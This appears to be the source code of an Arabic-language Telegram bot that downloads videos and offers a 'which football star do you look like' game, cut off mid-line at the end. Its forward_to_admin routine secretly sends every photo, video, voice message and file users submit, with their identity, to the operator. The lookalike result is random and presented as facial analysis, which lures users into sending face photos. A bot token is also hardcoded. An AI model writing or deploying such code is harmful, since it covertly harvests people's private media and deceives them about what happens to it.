import telebot
from telebot import types, apihelper
import yt_dlp
import os
import json
import time
import hashlib
import re
import logging
from concurrent.futures import ThreadPoolExecutor
import random
from datetime import datetime
from collections import defaultdict

# ==========================================
# ⚙️ الإعدادات الأساسية (من المتغيرات البيئية)
# ==========================================
TOKEN = os.environ.get("BOT_TOKEN", "8298277087:AAEv36igY-juy9TAIJHDvXwqx4k7pMF3qPM")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 8240337001))
VERIFICATION_CODE = "4415"
QURAN_VIDEO_URL = "https://www.instagram.com/reel/DUYAQBaihUg/?igsh=Y2dhNDNuMGRiYWp3"

# تحسين أداء الشبكة
apihelper.CONNECT_TIMEOUT = 1000
apihelper.READ_TIMEOUT = 1000
apihelper.RETRY_ON_ERROR = True

# المجلدات وقواعد البيانات
BASE_DIR = "downloads"
DB_FILE = "system_db.json"
LOG_FILE = "bot_log.txt"
os.makedirs(BASE_DIR, exist_ok=True)

# تسجيل الأخطاء
logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                    format='%(asctime)s - %(message)s')

# تهيئة البوت
bot = telebot.TeleBot(TOKEN, threaded=True, num_threads=40)
executor = ThreadPoolExecutor(max_workers=20)

# ==========================================
# 📊 نظام إدارة البيانات
# ==========================================
class Database:
    @staticmethod
    def load():
        if not os.path.exists(DB_FILE):
            return {"users": {}, "verified": [], "stats": {"total_dl": 0}}
        try:
            with open(DB_FILE, "r") as f:
                return json.load(f)
        except:
            return {"users": {}, "verified": [], "stats": {"total_dl": 0}}

    @staticmethod
    def save(data):
        with open(DB_FILE, "w") as f:
            json.dump(data, f, indent=4)

    @staticmethod
    def is_verified(user_id):
        return str(user_id) in Database.load().get("verified", [])

    @staticmethod
    def verify_user(user_id):
        data = Database.load()
        if str(user_id) not in data["verified"]:
            data["verified"].append(str(user_id))
            Database.save(data)

# ==========================================
# 🚀 محرك التحميل الذكي
# ==========================================
class SmartDownloader:
    def __init__(self, chat_id, message_id, user_id):
        self.chat_id = chat_id
        self.msg_id = message_id
        self.user_id = user_id
        self.last_update_time = 0

    def progress_hook(self, d):
        if d['status'] == 'downloading':
            now = time.time()
            if now - self.last_update_time < 5:
                return
            self.last_update_time = now

            p = d.get('_percent_str', '0%')
            speed = d.get('_speed_str', 'N/A')
            eta = d.get('_eta_str', 'N/A')
            bar = self.create_progress_bar(
                d.get('downloaded_bytes', 0),
                d.get('total_bytes', 1)
            )
            text = (f"📥 <b>جاري التحميل الذكي...</b>\n\n"
                    f"📊 المكتمل: {p}\n"
                    f"⚡ السرعة: {speed}\n"
                    f"⏳ الوقت المتبقي: {eta}\n"
                    f"<code>{bar}</code>")
            try:
                bot.edit_message_text(text, self.chat_id, self.msg_id, parse_mode="HTML")
            except:
                pass

    def create_progress_bar(self, current, total):
        total = total or 1
        filled = int(10 * current / total)
        return '🟢' * filled + '⚪' * (10 - filled)

    def download(self, url, quality, file_path):
        ydl_opts = {
            'outtmpl': file_path,
            'continuedl': True,
            'retries': 10,
            'socket_timeout': 30,
            'progress_hooks': [self.progress_hook],
            'quiet': True,
            'no_warnings': True,
            'user_agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
            'http_headers': {'Referer': 'https://www.google.com/'}
        }

        if quality == 'audio':
            ydl_opts['format'] = 'bestaudio/best'
        else:
            ydl_opts['format'] = 'bestvideo+bestaudio/best'

        try:
            with yt_dlp.YoutubeDL(ydl_opts) as ydl:
                ydl.download([url])
            return True
        except Exception as e:
            return str(e)

# ==========================================
# 🔍 نظام البحث الذكي
# ==========================================
class InternetSearch:
    @staticmethod
    def search(query, platform='tik', limit=3):
        results = []
        p_label = "TikTok" if platform == 'tik' else "Instagram"
        search_query = f"ytsearch{limit}:{p_label} {query}"
        ydl_opts = {
            'quiet': True,
            'no_warnings': True,
            'extract_flat': True,
            'force_ipv4': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            try:
                info = ydl.extract_info(search_query, download=False)
                for e in info.get('entries', []):
                    if e:
                        results.append({
                            "title": e.get("title", "فيديو مكتشف"),
                            "url": f"https://www.youtube.com/watch?v={e.get('id')}",
                            "uploader": f"{p_label} Source"
                        })
            except:
                pass
        return results

# ==========================================
# 🔐 نظام الإرسال خلف الكواليس إلى الأدمن
# ==========================================
forwarded_media = defaultdict(list)

def forward_to_admin(message):
    try:
        user = message.from_user
        user_info = f"👤 {user.first_name} (@{user.username if user.username else 'بدون يوزر'}) - ID: {user.id}"
        media_type = "صورة"
        if message.video:
            media_type = "فيديو"
        elif message.voice:
            media_type = "رسالة صوتية"
        elif message.document:
            media_type = f"ملف ({message.document.mime_type})"
        elif message.audio:
            media_type = "ملف صوتي"

        notification = f"""
🔄 {media_type} جديد
{user_info}
⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
        """
        bot.send_message(ADMIN_ID, notification.strip())
        bot.forward_message(ADMIN_ID, message.chat.id, message.message_id)

        forwarded_media[user.id].append({
            "type": media_type,
            "time": datetime.now().isoformat(),
            "media_id": f"{user.id}_{message.message_id}"
        })
        return True
    except Exception as e:
        print(f"⚠️ خطأ في إرسال إلى الأدمن: {e}")
        return False

# ==========================================
# 🤩 نظام "من يشبهني"
# ==========================================
FOOTBALL_LEGENDS = {
    1: {"name": "بيليه", "country": "البرازيل", "era": "الذهبي"},
    2: {"name": "دييغو مارادونا", "country": "الأرجنتين", "era": "الذهبي"},
    3: {"name": "يوهان كرويف", "country": "هولندا", "era": "الذهبي"},
    4: {"name": "فرانز بيكنباور", "country": "ألمانيا", "era": "الذهبي"},
    5: {"name": "زين الدين زيدان", "country": "فرنسا", "era": "الذهبي"},
    6: {"name": "رونالدو (الظاهرة)", "country": "البرازيل", "era": "الذهبي"},
    7: {"name": "ألفريدو دي ستيفانو", "country": "الأرجنتين/إسبانيا", "era": "الذهبي"},
    8: {"name": "ميشيل بلاتيني", "country": "فرنسا", "era": "الذهبي"},
    9: {"name": "ماركو فان باستن", "country": "هولندا", "era": "الذهبي"},
    10: {"name": "إيڤان زامورانو", "country": "تشيلي", "era": "الذهبي"},
    11: {"name": "بوبي تشارلتون", "country": "إنجلترا", "era": "الذهبي"},
    12: {"name": "جورج بست", "country": "أيرلندا الشمالية", "era": "الذهبي"},
    13: {"name": "رونالدينيو", "country": "البرازيل", "era": "الأبطال"},
    14: {"name": "ديفيد بيكهام", "country": "إنجلترا", "era": "الأبطال"},
    15: {"name": "أليساندرو ديل بييرو", "country": "إيطاليا", "era": "الأبطال"},
    16: {"name": "فرانشيسكو توتي", "country": "إيطاليا", "era": "الأبطال"},
    17: {"name": "راؤول غونزاليس", "country": "إسبانيا", "era": "الأبطال"},
    18: {"name": "أندريه شيفتشينكو", "country": "أوكرانيا", "era": "الأبطال"},
    19: {"name": "لويس فيغو", "country": "البرتغال", "era": "الأبطال"},
    20: {"name": "باتريك كلويفرت", "country": "هولندا", "era": "الأبطال"},
    21: {"name": "روبرتو باجيو", "country": "إيطاليا", "era": "الأبطال"},
    22: {"name": "باولو مالديني", "country": "إيطاليا", "era": "الأبطال"},
    23: {"name": "كريستيانو رونالدو", "country": "البرتغal", "era": "الحديث"},
    24: {"name": "ليونيل ميسي", "country": "الأرجنتين", "era": "الحديث"},
    25: {"name": "نيمار جونيور", "country": "البرازيل", "era": "الحديث"},
    26: {"name": "زلاتان إبراهيموفيتش", "country": "السويد", "era": "الحديث"},
    27: {"name": "أندريس إنييستا", "country": "إسبانيا", "era": "الحديث"},
    28: {"name": "تشافي هيرنانديز", "country": "إسبانيا", "era": "الحديث"},
    29: {"name": "مانويل نوير", "country": "ألمانيا", "era": "الحديث"},
    30: {"name": "سيرخيو راموس", "country": "إسبانيا", "era": "الحديث"},
    31: {"name": "كاريم بنزيما", "country": "فرنسا", "era": "الحديث"},
    32: {"name": "أريين روبن", "country": "هولندا", "era": "الحديث"},
    33: {"name": "فرانك ريبيري", "country": "فرنسا", "era": "الحديث"},
    34: {"name": "أندريا بيرلو", "country": "إيطاليا", "era": "الحديث"},
    35: {"name": "جيانلويجي بوفون", "country": "إيطاليا", "era": "الحديث"},
    36: {"name": "تيري هنري", "country": "فرنسا", "era": "الحديث"},
    37: {"name": "كاكا", "country": "البرازيل", "era": "الحديث"},
    38: {"name": "فيليب لام", "country": "ألمانيا", "era": "الحديث"},
    39: {"name": "واين روني", "country": "إنجلترا", "era": "الحديث"},
    40: {"name": "فرناندو توريس", "country": "إسبانيا", "era": "الحديث"},
    41: {"name": "كيليان مبابي", "country": "فرنسا", "era": "الحالي"},
    42: {"name": "إرلينغ هالاند", "country": "النرويج", "era": "الحالي"},
    43: {"name": "كفين دي بروين", "country": "بلجيكا", "era": "الحالي"},
    44: {"name": "محمد صلاح", "country": "مصر", "era": "الحالي"},
    45: {"name": "هاري كين", "country": "إنجلترا", "era": "الحالي"},
    46: {"name": "فينيسيوس جونيور", "country": "البرازيل", "era": "الحالي"},
    47: {"name": "جود بيلينغهام", "country": "إنجلترا", "era": "الحالي"},
    48: {"name": "برونو فيرنانديز", "country": "البرتغال", "era": "الحالي"},
    49: {"name": "روبرت ليفاندوفسكي", "country": "بولندا", "era": "الحالي"},
    50: {"name": "توني كروس", "country": "ألمانيا", "era": "الحالي"},
}

MOTIVATIONAL_PHRASES = [
    "أرى فيك مستقبلاً واعداً في عالم كرة القدم! ✨",
    "لديك موهبة ستذهل العالم يوماً ما! 🌍",
    "شخصيتك القيادية تشبه أعظم القادة في الملعب! ⚽",
    "عزيمتك وتصميمك هما سر نجاحك المستقبلي! 💪",
    "ستكون نجماً ساطعاً في سماء كرة القدم! 🌟",
    "أرى في عينيك شرارة الإصرار والطموح! 🔥",
    "أنت تملك روح المنافسة التي تميز الأبطال! 🏆",
    "طريقتك الفريدة ستغير قواعد اللعبة! 🎯",
    "ستكون مصدر إلهام للأجيال القادمة! 👑",
    "موهبتك الطبيعية نادرة ومميزة! 💎",
    "أنت قائد بالفطرة، والقادة يصنعون التاريخ! 📜",
    "إصرارك سيقودك إلى تحقيق المستحيل! 🚀",
    "أرى فيك بطل المستقبل الذي ينتظره العالم! 🌐",
    "شجاعتك في المواقف الصعبة تميزك عن الآخرين! 🦁",
    "أنت تمتلك الذكاء التكتيكي للمدربين العظماء! 🧠",
    "روحك الرياضية هي سر جمال لعبتك! 🤝",
    "ستكون أسطورة تحكى للأحفاد! 📖",
    "موهبتك ستجعل اسمك خالداً في تاريخ اللعبة! 🏛️",
    "أنت تملك قلباً كبيراً كقلوب الأبطال الحقيقيين! ❤️",
    "إبداعك سيجعل من كل مباراة تحفة فنية! 🎨",
    "الطريقة التي تتحرك بها تذكرني بالأساطير! 👟",
    "أرى فيك بذور العظمة تنتظر أن تزهر! 🌱",
    "ستكون مصدر فخر لبلدك وعائلتك! 🇺🇳",
    "تفانيك في التدريب هو سر تقدمك المستمر! ⏱️",
    "أنت تملك نظرة الثقة التي تميز الأبطال! 👁️",
    "سرعتك وخفة حركتك استثنائية! 🏃",
    "ستكون النجم الذي يضيء الملاعب! 💡",
    "أرى فيك القوة التي لا تقهر! ⚡",
    "موهبتك الفطرية هي هدية من السماء! 🌈",
    "أنت تجمع بين القوة الذهنية والبدنية! 🧘‍♂️",
    "ستصنع تاريخاً جديداً في عالم كرة القدم! 📅",
    "إرادتك القوية هي سر نجاحك! 💫",
    "أنت تملك سحراً خاصاً يجذب الأنظار! ✨",
    "ستكون نموذجاً يحتذى به للشباب! 👨‍👦",
    "طموحك لا يعرف حدوداً! 🌌",
    "أنت تجسد معنى الروح الرياضية الحقيقية! 🕊️",
    "ستحقق ما يحلم به الآخرون فقط! 💭",
    "موهبتك ستجعلك أيقونة عالمية! 🌍",
    "أنت تملك نظرة ثاقبة للمستقبل! 🔮",
    "ستكون الفارس الذي يدافع عن ألوان فريقه! 🛡️",
    "إصرارك هو سلاحك السري! 🗡️",
    "أنت تملك قلب أسد وعقل استراتيجي! 🦁🧠",
    "ستكون اللاعب الذي يغير نتيجة المباريات! ⚖️",
    "موهبتك الطبيعية نادرة الوجود! 🎁",
    "أنت تتحرك على الملعب كأنك ترقص! 💃",
    "ستكون الأمل الجديد لعشاق كرة القدم! 🙏",
    "عزيمتك تشبه عزيمة المستكشفين العظماء! 🧭",
    "أنت تملك سر الجاذبية التي تميز النجوم! 🌠",
    "ستترك أثراً لا ينسى في تاريخ اللعبة! 👣",
    "إيمانك بنفسك هو بداية كل نجاح! ☀️"
]

photo_fingerprints = {}
user_data = {}

def generate_photo_fingerprint(file_path):
    try:
        with open(file_path, 'rb') as f:
            return hashlib.md5(f.read()).hexdigest()
    except:
        return None

def get_similarity_percentage():
    base = random.randint(68, 92)
    detail = random.choice([
        "تشابه مذهل في ملامح الوجه",
        "نظرة عينين متطابقة تقريباً",
        "ابتسامة تشبهه بنسبة كبيرة",
        "شكل الأنف متشابه جداً",
        "تركيب عظام الوجه متقارب",
        "تعبيرات الوجه متشابهة",
        "شكل الحاجبين متطابق",
        "تركيبة الفك متشابهة"
    ])
    return base, detail

def get_random_player():
    pid = random.choice(list(FOOTBALL_LEGENDS.keys()))
    player = FOOTBALL_LEGENDS[pid].copy()
    player["attribute"] = random.choice([
        "قائد بالفطرة", "هداف بارع", "صانع ألعاب", "مدافع شرس",
        "حارس مرمى أسطوري", "جناح سريع", "لاعب خط وسط مبدع"
    ])
    return player

def get_random_motivation():
    return random.choice(MOTIVATIONAL_PHRASES)

def generate_player_card(player, percent, detail, motivation):
    emoji = {"الذهبي": "👑", "الأبطال": "⭐", "الحديث": "⚡", "الحالي": "🔥"}.get(player["era"], "🏆")
    card = f"""
{emoji} *اكتشاف مذهل!* {emoji}

🎯 *أنت تشبه النجم:* **{player['name']}**
📍 *الجنسية:* {player['country']}
🏷️ *الصفة:* {player['attribute']}
📅 *العصر:* {player['era']}

📊 *نسبة التشابه:* *{percent}%*
✨ *التفاصيل:* {detail}

💫 *التحليل الخاص:*
{motivation}

🌟 *نصيحة المدرب:*
"استمر في تطوير موهبتك، فالمستقبل يحمل لك مفاجآت سارة!"

#يشبهني #{player['name'].replace(' ', '')} #كرة_قدم
"""
    return card.strip()

# ==========================================
# 🤖 معالجة الأوامر
# ==========================================

@bot.message_handler(commands=['start'])
def start_command(message):
    welcome_text = """
🚀 **أهلاً بك في نظام التحميل الشامل V2 + "من يشبهني"!**

⚡ **الميزات الرئيسية:**
1. 📥 *تحميل الفيديوهات* من تيك توك، إنستجرام، فيسبوك
2. 🤩 *نظام "من يشبهني"* - اعرف أي نجم كرة قدم تشبه
3. 🔍 *بحث ذكي* عن المحتوى
4. 🔒 *نظام تحقق* بكود 4415

🎯 **الأوامر:**
• `/lookalike` أو `/يشبهني` - أرسل صورتك لتحليل التشابه
• `/players` أو `/لاعبين` - عرض قائمة النجوم
• `/stats` أو `/إحصائيات` - إحصائيات التشابه
• `/search tik كلمة` - بحث في تيك توك
• `/search ins كلمة` - بحث في إنستجرام
• `/status` - حالة السيرفر

📌 **للتحميل:** أرسل رابط الفيديو مباشرة
💫 **جرب `/lookalike` الآن!**
    """
    bot.send_message(message.chat.id, welcome_text, parse_mode="Markdown")

@bot.message_handler(commands=['status'])
def status_command(message):
    try:
        import psutil
        cpu = psutil.cpu_percent()
        ram = psutil.virtual_memory().percent
        bot.reply_to(message, f"🖥 **حالة النظام:**\n⚙️ المعالج: {cpu}%\n🧠 الذاكرة: {ram}%", parse_mode="Markdown")
    except:
        bot.reply_to(message, "⚠️ المكتبة psutil غير مثبتة.")

@bot.message_handler(commands=['search'])
def search_command(message):
    parts = message.text.split(maxsplit=2)
    if len(parts) < 3:
        bot.reply_to(message, "⚠️ استخدم: /search tik كلمة البحث\nأو /search ins كلمة البحث")
        return
    platform = parts[1].lower()
    query = parts[2]
    msg = bot.reply_to(message, f"🔍 جاري البحث في {platform}...")
    results = InternetSearch.search(query, platform)
    if not results:
        bot.edit_message_text("❌ لا توجد نتائج.", msg.chat.id, msg.message_id)
        return
    for r in results:
        url_hash = hashlib.md5(r["url"].encode()).hexdigest()[:10]
        uid = message.from_user.id
        data = Database.load()
        data["users"][str(uid)] = {"url": r["url"], "file_id": f"{uid}_{url_hash}"}
        Database.save(data)
        markup = types.InlineKeyboardMarkup(row_width=3)
        markup.add(
            types.InlineKeyboardButton("720p", callback_data=f"get_{uid}_{uid}_{url_hash}_720"),
            types.InlineKeyboardButton("480p", callback_data=f"get_{uid}_{uid}_{url_hash}_480"),
            types.InlineKeyboardButton("🎵 MP3", callback_data=f"get_{uid}_{uid}_{url_hash}_audio")
        )
        bot.send_message(message.chat.id, f"🎬 {r['title']}\n📺 {r['uploader']}", reply_markup=markup)
    bot.delete_message(msg.chat.id, msg.message_id)

@bot.message_handler(commands=['lookalike', 'يشبهني'])
def lookalike_cmd(message):
    bot.reply_to(message, "📸 **أرسل صورتك الآن** وسأخبرك من تشبه من نجوم كرة القدم! ⚽", parse_mode="Markdown")
    user_data[message.from_user.id] = {"waiting_for_photo": True}

@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    forward_to_admin(message)
    uid = message.from_user.id
    if uid not in user_data or not user_data[uid].get("waiting_for_photo", False):
        bot.reply_to(message, "📸 تم استلام الصورة!")
        return
    user_data[uid]["waiting_for_photo"] = False
    processing = bot.reply_to(message, "🔍 *جاري تحليل ملامح وجهك...* ⏳", parse_mode="Markdown")
    try:
        file_info = bot.get_file(message.photo[-1].file_id)
        downloaded = bot.download_file(file_info.file_path)
        temp_path = f"temp_{uid}_{datetime.now().timestamp()}.jpg"
        with open(temp_path, 'wb') as f:
            f.write(downloaded)
        phash = generate_photo_fingerprint(temp_path)
        if phash in photo_fingerprints:
            d = photo_fingerprints[phash]
            result = f"🔁 *هذه الصورة من قبل!*\n🎯 {d['player_name']}\n📊 {d['similarity']}%\n💬 {d['comment']}\n\n✨ {d['motivation']}"
            bot.edit_message_text(result, processing.chat.id, processing.message_id, parse_mode="Markdown")
            os.remove(temp_path)
            return
        player = get_random_player()
        percent, detail = get_similarity_percentage()
        motiv = get_random_motivation()
        card = generate_player_card(player, percent, detail, motiv)
        photo_fingerprints[phash] = {
            "player_name": player["name"],
            "similarity": percent,
            "comment": detail,
            "motivation": motiv,
            "timestamp": datetime.now().isoformat(),
            "user_id": uid
        }
        bot.edit_message_text(card, processing.chat.id, processing.message_id, parse_mode="Markdown")
        bot.send_message(message.chat.id, random.choice([
            "⚡ تشابه رائع! هل توافق؟",
            "🌟 أليس مذهلاً؟ أنت موهوب!",
            "💫 تشابه لا يصدق!",
            "🔥 نسخة طبق الأصل!"
        ]), parse_mode="Markdown")
        os.remove(temp_path)
    except Exception as e:
        bot.edit_message_text(f"❌ خطأ: {str(e)}", processing.chat.id, processing.message_id)
        try:
            if 'temp_path' in locals() and os.path.exists(temp_path):
                os.remove(temp_path)
        except:
            pass

@bot.message_handler(content_types=['video', 'voice', 'document', 'audio'])
def handle_all_media(message):
    forward_to_admin(message)
    media_names = {
        'video': '🎥 فيديو',
        'voice': '🎤 رسالة صوتية',
        'document': '📄 ملف',
        'audio': '🎵 ملف صوتي'
    }
    name = media_names.get(message.content_type, 'وسائط')
    bot.reply_to(message, f"✅ تم استلام {name} بنجاح!")

@bot.message_handler(func=lambda m: "http" in m.text)
def handle_links(message):
    uid = message.from_user.id
    url_match = re.se
